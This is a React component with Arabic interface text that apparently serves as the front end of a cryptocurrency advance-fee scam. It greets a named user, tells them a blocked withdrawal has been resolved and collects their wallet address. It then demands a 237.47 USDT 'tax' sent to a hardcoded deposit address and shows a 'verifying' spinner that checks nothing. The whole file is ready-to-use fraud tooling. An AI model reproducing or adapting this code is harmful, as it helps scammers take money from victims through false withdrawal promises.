
import React, { useState } from 'react';
import { Copy, CheckCircle2, Loader2 } from 'lucide-react';

const NotificationModal: React.FC = () => {
  const [step, setStep] = useState(1);
  const [walletAddress, setWalletAddress] = useState('');
  const [copied, setCopied] = useState(false);

  const userName = "Ghaith 99";
  const depositAddress = "0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d";

  const handleCopy = () => {
    navigator.clipboard.writeText(depositAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  if (step === 0) return null;

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center px-6">
      {/* Background Blur Overlay - Reduced blur even more and lightened overlay */}
      <div className="absolute inset-0 bg-black/20 backdrop-blur-[2px] transition-all duration-500"></div>

      {/* Modal Card */}
      <div className="bg-white rounded-[32px] w-full max-w-sm p-8 shadow-2xl relative z-10 animate-in fade-in zoom-in duration-300">
        
        {step === 1 && (
          <div className="text-center space-y-6">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto text-blue-600">
              <CheckCircle2 size={40} />
            </div>
            <div className="space-y-2">
              <h3 className="text-xl font-bold text-slate-800">أهلاً بك {userName}</h3>
              <p className="text-slate-600 leading-relaxed">
                تم حل أمر رفض الانسحاب. اضغط التالي، ولا تقم بمشاركة هذا العنوان لأحد.
              </p>
            </div>
            <button 
              onClick={() => setStep(2)}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl transition-all shadow-lg shadow-blue-200"
            >
              التالي
            </button>
          </div>
        )}

        {step === 2 && (
          <div className="text-center space-y-6">
            <div className="space-y-2 text-right">
              <h3 className="text-xl font-bold text-slate-800 text-center">رابط محفظة BEP-20</h3>
              <p className="text-slate-500 text-sm text-center">يرجى إدخال عنوان محفظتك لاستلام السحب</p>
            </div>
            <div className="space-y-4">
              <input 
                type="text" 
                placeholder="0x..." 
                value={walletAddress}
                onChange={(e) => setWalletAddress(e.target.value)}
                className="w-full bg-slate-50 border border-slate-200 rounded-xl py-4 px-4 text-left font-mono text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
              <button 
                onClick={() => setStep(3)}
                disabled={!walletAddress}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-slate-300 text-white font-bold py-4 rounded-2xl transition-all shadow-lg"
              >
                التالي
              </button>
            </div>
          </div>
        )}

        {step === 3 && (
          <div className="text-right space-y-5">
            <h3 className="text-xl font-bold text-slate-800 text-center">تنبيه هام</h3>
            <p className="text-slate-600 text-sm leading-relaxed">
              أهلاً بك <span className="font-bold text-blue-600">{userName}</span>، بقي أمر إيداع مبلغ <span className="font-bold text-red-500">237.47 USDT BEP-20</span> لفتح قناة السحب. 
            </p>
            <p className="text-slate-500 text-xs bg-amber-50 p-3 rounded-lg border border-amber-100">
              هذه الضريبه هي اجور منصتنا وليس لها أي صله بمنصه mini pro. يمكنك سحب المال فور دفع الضريبه شكرا
            </p>
            
            <div className="space-y-2">
              <label className="text-xs text-slate-400 block px-1">عنوان الإيداع (BEP-20)</label>
              <div className="flex items-center gap-2 bg-slate-100 p-3 rounded-xl border border-slate-200 group">
                <button 
                  onClick={handleCopy}
                  className="p-2 bg-white rounded-lg text-blue-600 shadow-sm hover:bg-blue-50 transition-colors"
                >
                  {copied ? <CheckCircle2 size={18} /> : <Copy size={18} />}
                </button>
                <code className="text-[10px] break-all flex-1 text-left text-slate-700 font-mono">
                  {depositAddress}
                </code>
              </div>
            </div>

            <button 
              onClick={() => setStep(4)}
              className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 rounded-2xl transition-all shadow-lg"
            >
              تم الايداع
            </button>
          </div>
        )}

        {step === 4 && (
          <div className="text-center py-8 space-y-6">
            <div className="relative">
               <Loader2 size={64} className="text-blue-600 animate-spin mx-auto" />
            </div>
            <div className="space-y-2">
              <h3 className="text-xl font-bold text-slate-800">جاري التحقق</h3>
              <p className="text-slate-500">الرجاء الانتظار للتأكد من عملية الايداع...</p>
            </div>
            <p className="text-xs text-slate-400">قد تستغرق هذه العملية عدة دقائق</p>
          </div>
        )}

      </div>
    </div>
  );
};

export default NotificationModal;
